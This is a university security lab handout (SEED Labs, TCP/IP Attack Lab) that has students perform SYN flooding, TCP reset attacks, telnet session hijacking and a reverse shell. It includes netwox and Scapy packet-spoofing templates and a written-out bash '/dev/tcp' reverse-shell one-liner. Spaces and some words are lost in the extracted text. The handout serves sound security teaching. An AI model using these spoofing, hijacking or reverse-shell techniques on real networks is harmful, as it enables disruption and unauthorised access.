SEEDLabsŒTCP/IPAttackLab 1 TCP/IPAttackLab Copyright©2018WenliangDu SyracuseUniversity ThedevelopmentofthisdocumentwaspartiallyfundedbytheNationalScienceFoundationunderAward No.1303306and1718086.ThisworkislicensedunderaCreativeCommonsAttribution-NonCommercial- ShareAlike4.0InternationalLicense.Ahuman-readablesummaryof andnotasubstitutefor thelicenseis thefollowing Youarefreetocopyandredistributethematerialinanymediumorformat.Youmustgive appropriatecredit.Ifyouremix transform orbuilduponthematerial youmustdistributeyourcontributions underthesamelicenseastheoriginal.Youmaynotusethematerialforcommercialpurposes 1LabOverview Thelearningobjectiveofthislabisforstudentstogainexperienceonvulnerabilities aswell asonattacksagainstthesevulnerabilities.Wisepeoplelearnfrommistakes.Insecurityeducation studymistakesthatleadtosoftwarevulnerabilities.Studyingmistakesfromthepastnotonlyhelpstudents understandwhysystemsarevulnerable whyaseemly-benignmistakecanturnintoadisaster andwhy manysecuritymechanismsareneeded.Moreimportantly italsohelpsstudentslearnthecommonpatterns ofvulnerabilities sotheycanavoidmakingsimilarmistakesinthefuture.Moreover usingvulnerabilities ascasestudies studentscanlearntheprinciplesofsecuredesign secureprogramming andsecuritytesting ThevulnerabilitiesintheTCP/IPprotocolsrepresentaspecialgenreofvulnerabilitiesinprotocolde- signsandimplementations theyprovideaninvaluablelessonastowhysecurityshouldbedesignedinfrom thebeginning ratherthanbeingaddedasanafterthought.Moreover studyingthesevulnerabilitieshelpstu- dentsunderstandthechallengesofnetworksecurityandwhymanynetworksecuritymeasuresareneeded Inthislab studentsneedtoconductseveralattacksontheTCPprotocol.Thislabcoversthefollowing topics Ł TCPSYNattack andSYNcookies Ł TCPresetattack Ł TCPsessionhijackingattack Ł Reverseshell Readingsandrelatedtopics DetailedcoverageofTCPattackscanbefoundinChapter13oftheSEED book ComputerSecurity AHands-onApproach byWenliangDu Labenvironment Thislabhasbeentestedonourpre-builtUbuntu16.04VM whichcanbedownloaded fromtheSEEDwebsite 2LabEnvironment NetworkSetup Toconductthislab studentsneedtohaveatleast3machines.Onecomputerisusedfor attacking thesecondcomputerisusedasthevictim andthethirdcomputerisusedastheobserver.Students cansetup3virtualmachinesonthesamehostcomputer ortheycansetup2virtualmachines andthenuse thehostcomputerasthethirdcomputer.Forthislab weputallthesethreemachinesonthesameLAN isdescribedinFigure1 SEEDLabsŒTCP/IPAttackLab 2 Figure1 EnvironmentSetup Netwox Tools Weneedtoolstosendoutnetworkpacketsofdifferenttypesandwithdifferentcontents Wecanuse Netwag todothat.However theGUIinterfaceof Netwag makesitdifforustoauto- matetheprocess.Therefore westronglysuggeststudentstouseitscommand-lineversion Netwox command whichistheunderlyingcommandinvokedby Netwag Netwox consistsofasuiteoftools eachhavinganumber.Youcanrunacommandlike following theparametersdependonwhichtoolyouareusing .Forsomeofthetool youhavetorunitwith therootprivilege $ sudonetwoxnumber parameters ... Ifyouarenotsurehowtosettheparameters youcanlookatthemanualbyissuing '' netwoxnumber -- help '' .Youcanalsolearntheparametersettingsbyrunning Netwag foreachcommandyouexecute fromthegraphicinterface Netwag actuallyinvokesacorresponding Netwox command anditdisplays theparametersettings.Therefore youcansimplycopyandpastethedisplayedcommand ScapyTool SomeofthetasksinthislabcanalsobeconductedusingScapy whichisapowerfulinterac- tivepacketmanipulationprogram.Scapyisverywellmaintainedandiswidelyused Netwox isnot beingmaintainedanymore.TherearemanyonlinetutorialsonScapy weexpectstudentstolearnhowto useScapyfromthosetutorials 3LabTasks Inthislab studentsneedtoconductattacksontheTCP/IPprotocols.Theycanusethe Netwox tools and/orothertoolsintheattacks.Alltheattacksareperformedon Linux operatingsystems.However instructorscanrequirestudentstoalsoconductthesameattacksonotheroperatingsystemsandcompare theobservations TosimplifytheﬁguessﬂofTCPsequencenumbersandsourceportnumbers weassumethatattackers areonthesamephysicalnetworkasthevictims.Therefore youcanusesniffertoolstogetthatinformation Thefollowingisthelistofattacksthatneedtobeimplemented SEEDLabsŒTCP/IPAttackLab 3 3.1Task1 SYNFloodingAttack Figure2 SYNFloodingAttack SYNisaformofDoSattackinwhichattackerssendmanySYNrequeststoavictim'sTCPport buttheattackershavenointentiontothe3-wayhandshakeprocedure.Attackerseitherusespoofed IPaddressordonotcontinuetheprocedure.Throughthisattack attackerscanthevictim'squeuethat isusedforhalf-openedconnections i.e.theconnectionsthathasSYN SYN-ACK buthasnotyet gottenaACKback.Whenthisqueueisfull thevictimcannottakeanymoreconnection.Figure2 illustratestheattack Thesizeofthequeuehasasystem-widesetting.In Linux wecancheckthesettingusingthefollowing command $ sudosysctl-qnet.ipv4.tcp_max_syn_backlog Wecanusecommand '' netstat-na '' tochecktheusageofthequeue i.e. thenumberofhalf- openedconnectionassociatedwithalisteningport.Thestateforsuchconnectionsis SYN-RECV .Ifthe 3-wayhandshakeisthestateoftheconnectionswillbe ESTABLISHED Inthistask youneedtodemonstratetheSYNattack.YoucanusetheNetwoxtooltoconduct theattack andthenuseasniffertooltocapturetheattackingpackets.Whiletheattackisgoingon run '' netstat-na '' commandonthevictimmachine andcomparetheresultwiththatbeforetheattack Pleasealsodescribehowyouknowwhethertheattackissuccessfulornot ThecorrespondingNetwoxtoolforthistaskisnumbered76.Hereisasimplehelpscreenforthistool Youcanalsotype '' netwox76 -- help '' togetthehelpinformation Listing1 TheusageoftheNetwoxTool76 Title Synflood Usage netwox76-iip-pport -sspoofip Parameters -i| -- dst-ipipdestinationIPaddress -p| -- dst-portportdestinationportnumber -s| -- spoofipspoofipIPspoofinitialzationtype SEEDLabsŒTCP/IPAttackLab 4 SYNCookieCountermeasure Ifyourattackseemsunsuccessful onethingthatyoucaninvestigateis whethertheSYNcookiemechanismisturnedon.SYNcookieisadefensemechanismtocountertheSYN attack.ThemechanismwillkickinifthemachinedetectsthatitisundertheSYNattack Youcanusethe sysctl commandtoturnon/offtheSYNcookiemechanism $ sudosysctl-a|grepcookie DisplaytheSYNcookieflag $ sudosysctl-wnet.ipv4.tcp_syncookies=0 turnoffSYNcookie $ sudosysctl-wnet.ipv4.tcp_syncookies=1 turnonSYNcookie PleaserunyourattackswiththeSYNcookiemechanismonandoff andcomparetheresults.Inyour report pleasedescribewhytheSYNcookiecaneffectivelyprotectthemachineagainsttheSYN attack.Ifyourinstructordoesnotcoverthemechanisminthelecture youcanouthowtheSYNcookie mechanismworksfromtheInternet NoteonScapy Althoughtheoretically wecanuseScapyforthistask wehaveobservedthatthenumber ofpacketssentoutbyScapypersecondismuchsmallerthanthatby Netwox .Thislowratemakesit diffortheattacktobesuccessful.WewerenotabletosucceedinSYNattacksusingScapy 3.2Task2 TCPRSTAttackson telnet ssh Connections TheTCPRSTAttackcanterminateanestablishedTCPconnectionbetweentwovictims.Forexample thereisanestablished telnet connection TCP betweentwousersAandB attackerscanspoofaRST packetfromAtoB breakingthisexistingconnection.Tosucceedinthisattack attackersneedtocorrectly constructtheTCPRSTpacket Inthistask youneedtolaunchanTCPRSTattacktobreakanexisting telnet connectionbetweenA andB.Afterthat trythesameattackonan ssh connection.Pleasedescribeyourobservations.Tosimplify thelab weassumethattheattackerandthevictimareonthesameLAN i.e. theattackercanobservethe TCPtrafbetweenAandB UsingNetwox ThecorrespondingNetwoxtoolforthistaskisnumbered78.Hereisasimplehelpscreen forthistool.Youcanalsotype '' netwox78 -- help '' togetthehelpinformation Listing2 TheusageoftheNetwoxTool78 Title ReseteveryTCPpacket Usage netwox78 -ddevice -ffilter -sspoofip Parameters -d| -- devicedevicedevicename { Eth0 } -f| -- filterfilterpcapfilter -s| -- spoofipspoofipIPspoofinitializationtype { linkbraw } UsingScapy PleasealsouseScapytoconducttheTCPRSTattack.Askeletoncodeisprovidedinthe following youneedtoreplaceeach @ @ @ @ withanactualvalue # ! /usr/bin/python fromscapy.allimport * ip=IP src= '' @ @ @ @ '' dst= '' @ @ @ @ '' tcp=TCP sport= @ @ @ @ dport= @ @ @ @ flags= '' @ @ @ @ '' seq= @ @ @ @ ack= @ @ @ @ SEEDLabsŒTCP/IPAttackLab 5 pkt=ip/tcp ls pkt send pkt verbose=0 3.3Task3 TCPRSTAttacksonVideoStreamingApplications LetusmaketheTCPRSTattackmoreinterestingbyexperimentingitontheapplicationsthatarewidely usedinnowadays.Wechoosethevideostreamingapplicationinthistask.Forthistask youcanchoose avideostreamingwebsitethatyouarefamiliarwith wewillnotnameanywebsitehere .Most ofvideosharingwebsitesestablishaTCPconnectionwiththeclientforstreamingthevideocontent.The attacker'sgoalistodisrupttheTCPsessionestablishedbetweenthevictimandvideostreamingmachine Tosimplifythelab weassumethattheattackerandthevictimareonthesameLAN.Inthefollowing describethecommoninteractionbetweenauser thevictim andsomevideo-streamingwebsite Ł Thevictimbrowsesforavideocontentinthevideo-streamingwebsite andselectsoneofthevideos forstreaming Ł Normallyvideocontentsarehostedbyadifferentmachine whereallthevideocontentsarelocated Afterthevictimselectsavideo aTCPsessionwillbeestablishedbetweenthevictimmachineand thecontentserverforthevideostreaming.Thevictimcanthenviewthevideohe/shehasselected YourtaskistodisruptthevideostreamingbybreakingtheTCPconnectionbetweenthevictimandthe contentserver.Youcanletthevictimuserbrowsethevideo-streamingsitefromanother virtual machineor fromthesame virtual machineastheattacker.Pleasebenotedthat toavoidliabilityissues anyattacking packetsshouldbetargetedatthevictimmachine whichisthemachinerunbyyourself notatthecontent servermachine whichdoesnotbelongtoyou .Youonlyneedtouse Netwox forthistask 3.4Task4 TCPSessionHijacking Figure3 TCPSessionHijackingAttack TheobjectiveoftheTCPSessionHijackingattackistohijackanexistingTCPconnection session betweentwovictimsbyinjectingmaliciouscontentsintothissession.Ifthisconnectionisa telnet session attackerscaninjectmaliciouscommands e.g.deletinganimportantintothissession causing thevictimstoexecutethemaliciouscommands.Figure3depictshowtheattackworks.Inthistask needtodemonstratehowyoucanhijacka telnet sessionbetweentwocomputers.Yourgoalistogetthe telnet servertorunamaliciouscommandfromyou.Forthesimplicityofthetask weassumethat theattackerandthevictimareonthesameLAN SEEDLabsŒTCP/IPAttackLab 6 UsingNetwox ThecorrespondingNetwoxtoolforthistaskisnumbered40.Hereispartofthemanual forthistool.Youcanalsotype '' netwox40 -- help '' togetthefullhelpinformation.Youmayalso needtouseWiresharktooutthecorrectparametersforbuildingthespoofedTCPpacket Listing3 Partusageofnetwoxtool40 Title SpoofIp4Tcppacket Usage netwox40 parameters ... Parameters -l| -- ip4-srcipSourceIP -m| -- ip4-dstipDestinationIP -j| -- ip4-ttluint32Timetolive -o| -- tcp-srcportTCPSourceportnumber -p| -- tcp-dstportTCPDestinationportnumber -q| -- tcp-seqnumuint32TCPsequencenumber -E| -- tcp-windowuint32TCPwindowsize -r| -- tcp-acknumuint32TCPacknowledgenumber -z| -- tcp-ack|+z| -- no-tcp-ackTCPackbit -H| -- tcp-datadataTCPdata YoucanuseWiresharktooutwhatvalueyoushouldputintoeachofthespoofedTCP packets.ItshouldbenotedintheTCPsessionhijackingsectionoftheSEEDbook thecommandlisted theredoesnotsetalltheoftheTCPandIPheaders.Thethatarenotsetwillusethedefault valueprovidedby netwox .ThosedefaultvaluesworkforUbuntu12.04 butsomeofthemdonotworkfor Ubuntu16.04.IfyouusetheSEEDbookasareference youneedtosetthoseaccordingly insteadof usingthedefault.AllthethatneedtobesetarelistedinListing3 Inthe netwox commandabove tcp-data partonlytakeshexdata.Ifwewanttoinjecta commandstring whichistypicallyrepresentedasahuman-readableASCIIstring weneedtoconvertit intoahexstring.Therearemanywaystodothat butwewilljustuseaverysimplecommandinPython.In thefollowing weconvertanASCIIstring '' HelloWorld '' toahexstring thequotationmarksarenot included $ python > > > '' HelloWorld '' .encode `` hex '' '48656c6c6f20576f726c64' UsingScapy PleasealsouseScapytoconducttheTCPSessionHijackingattack.Askeletoncodeis providedinthefollowing youneedtoreplaceeach @ @ @ @ withanactualvalue # ! /usr/bin/python fromscapy.allimport * ip=IP src= '' @ @ @ @ '' dst= '' @ @ @ @ '' tcp=TCP sport= @ @ @ @ dport= @ @ @ @ flags= '' @ @ @ @ '' seq= @ @ @ @ ack= @ @ @ @ data= '' @ @ @ @ '' pkt=ip/tcp/data ls pkt send pkt verbose=0 SEEDLabsŒTCP/IPAttackLab 7 3.5Task5 CreatingReverseShellusingTCPSessionHijacking Whenattackersareabletoinjectacommandtothevictim'smachineusingTCPsessionhijacking arenotinterestedinrunningonesimplecommandonthevictimmachine theyareinterestedinrunning manycommands.Obviously runningthesecommandsallthroughTCPsessionhijackingisinconvenient Whatattackerswanttoachieveistousetheattacktosetupabackdoor sotheycanusethisbackdoorto convenientlyconductfurtherdamages Atypicalwaytosetupbackdoorsistorunareverseshellfromthevictimmachinetogivetheattackthe shellaccesstothevictimmachine.Reverseshellisashellprocessrunningonaremotemachine connecting backtotheattacker'smachine.Thisgivesanattackeraconvenientwaytoaccessaremotemachineonceit hasbeencompromised Inthefollowing wewillshowhowwecansetupareverseshellifwecandirectlyrunacommandon thevictimmachine i.e.theservermachine .IntheTCPsessionhijackingattack attackerscannotdirectly runacommandonthevictimmachine sotheirjobsistorunareverse-shellcommandthroughthesession hijackingattack.Inthistask studentsneedtodemonstratethattheycanachievethisgoal Use netcat tolistentoconnection b Runthereverseshell Figure4 Reverseshellconnectiontothelistening netcat process Tohavea bash shellonaremotemachineconnectbacktotheattacker'smachine theattackerneedsa processwaitingforsomeconnectiononagivenport.Inthisexample wewilluse netcat .Thisprogram allowsustospecifyaportnumberandcanlistenforaconnectiononthatport.InFigure4 netcat nc forshort isusedtolistenforaconnectiononport9090.InFigure4 b /bin/bash command representsthecommandthatwouldnormallybeexecutedonacompromisedserver.Thiscommandhasthe followingpieces Ł '' /bin/bash-i '' standsforinteractive meaningthattheshellmustbeinteractive mustprovide ashellprompt Ł '' > /dev/tcp/10.0.2.4/9090 '' Thiscausestheoutput stdout oftheshelltoberedirected tothetcpconnectionto 10.0.2.4 'sport 9090 .Theoutput stdout isrepresentedbydescriptor number1 Ł '' 0 < & 1 '' Filedescriptor0representsthestandardinput stdin .Thiscausesthe stdin forthe shelltobeobtainedfromthetcpconnection SEEDLabsŒTCP/IPAttackLab 8 Ł '' 2 > & 1 '' Filedescriptor2representsstandarderror stderr .Thiscausestheerroroutputtobe redirectedtothetcpconnection Insummary '' /bin/bash-i > /dev/tcp/10.0.2.4/90900 < & 12 > & 1 '' startsa bash shell withitsinputcomingfromatcpconnection anditsstandardanderroroutputsbeingredirectedtothesame tcpconnection.InFigure4 whenthe bash shellcommandisexecutedon 10.0.2.8 itconnectsback tothe netcat processstartedon 10.0.2.4 .Thisisviathe '' Connection10.0.2.8 accepted '' messagedisplayedby netcat Theshellpromptobtainedfromtheconnectionisnowconnectedtothe bash shell.Thiscanbeob- servedfromthedifferenceinthecurrentworkingdirectory printedvia pwd .Beforetheconnectionwas established pwd returned /home/seed .Once netcat isconnectedto bash pwd inthenewshell returns /home/seed/Documents directorycorrespondingtowhere /bin/bash isstartedfrom .We canalsoobservetheIPaddressdisplayedintheshellpromptisalsochangedto10.0.2.8 whichisthesame asthatontheservermachine.Theoutputfrom netstat showstheestablishedconnection Thedescriptionaboveshowshowyoucansetupareverseshellifyouhavetheaccesstothetarget machine whichisthe telnet serverinoursetup butinthistask youdonothavesuchanaccess.Your taskistolaunchanTCPsessionhijackingattackonanexisting telnet sessionbetweenauserandthe targetserver.Youneedtoinjectyourmaliciouscommandintothehijackedsession soyoucangetareverse shellonthetargetserver.YoucanuseeitherNetwoxorScapyforthistask usingScapyismoreconvenient 4LabReport Youshouldsubmitalabreport.Thereportshouldcoverthefollowingsections Ł Design Thedesignofyourattacks includingtheattackingstrategies thepacketsthatyouusein yourattacks thetoolsthatyouused etc Ł ObservationandExplanation Isyourattacksuccessful ? Howdoyouknowwhetherithassuc- ceededornot ? Whatdoyouexpecttosee ? Whathaveyouobserved ? Istheobservationasurpriseto ? 